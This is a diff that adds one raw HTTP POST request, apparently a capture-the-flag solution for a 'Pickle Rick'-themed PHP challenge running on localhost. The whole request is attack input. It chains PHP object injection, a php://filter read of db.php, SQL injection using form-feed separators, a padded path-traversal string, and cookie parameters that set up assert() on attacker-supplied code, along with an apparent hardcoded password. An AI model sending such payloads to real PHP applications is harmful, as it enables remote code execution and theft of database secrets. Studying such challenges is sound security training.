@@ -1,0 +1,10 @@
+POST //?first=pickle_rick&second=122804&third=/dev/fd/11&fourth=O%3a%2b17%3a"injection_chambre"%3a3%3a{s%3a5%3a"sprue"%3bs%3a4%3a"pass"%3bs%3a11%3a"mold_plate1"%3bs%3a4%3a"test"%3bs%3a11%3a"mold_plate2"%3bR%3a3%3b}&sixth=php://filter/resource=ricksecret/db.php&sixth.second=R1cKs_Ung3s5b4L3_P45sw0Rd&seventh=!%0cWHERE%0csecret='%0cOR%0c1=1%0cUNION%0cSELECT%0c'%0cUNION%0cSELECT%0c"th3sm4rt3s7"&eigth=aa HTTP/1.1
+Host: 127.0.0.1:20000
+User-Agent: Oldrick
+Accept: */*
+Cookie: _SESSION[is_rick]=raouf; A=assert;B=var_dump(pickle2rick());
+Content-Length: 138
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+fifth=./././././././././././././././././././././././././././././././././././././././././././././././././ricksecret/db.php&nineth=}$A($B);{
